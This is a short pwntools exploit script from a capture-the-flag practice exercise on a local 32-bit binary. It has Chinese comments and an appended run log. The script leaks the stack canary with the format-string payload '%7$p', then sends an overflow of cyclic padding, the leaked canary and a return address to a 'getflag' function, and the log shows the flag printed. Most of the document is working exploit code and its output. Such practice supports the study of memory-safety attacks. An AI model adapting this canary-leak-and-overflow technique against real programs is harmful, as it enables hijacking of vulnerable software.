from pwn import *

# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')#arch也可以是i386~看文件


p = process('./bin')

payload = '%7$p'  # 可以
# payload = '%7$x' # 可以
p.sendline(payload)
canary = int(p.recv(),16)
print("canary: ", canary) # p.recv()应该返回一个十六进制字符串，然后通过int()函数将其转换为整数，并将结果存储在canary变量中。
print("hex(canary): ", hex(canary))
getflag = 0x0804863B
# payload = b'a'*100 + p32(canary) + b'a'*12 + p32(getflag) # 可以
# payload = b'a'*(0x70-0x0c) + p32(canary) + b'b'* 0xc + p32(getflag) # 可以
payload = cyclic(0x70-0x0c) + p32(canary) + cyclic(0xc) + p32(getflag) # 可以

p.send(payload)
p.interactive()


"""
┌──(root㉿kali)-[~/ctf-practice/canary/01]
└─# python exp.py
[+] Starting local process './bin': pid 174011
/root/ctf-practice/canary/01/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(payload)
canary:  4237685760
hex(canary):  0xfc95f400
[*] Switching to interactive mode
flag123

"""

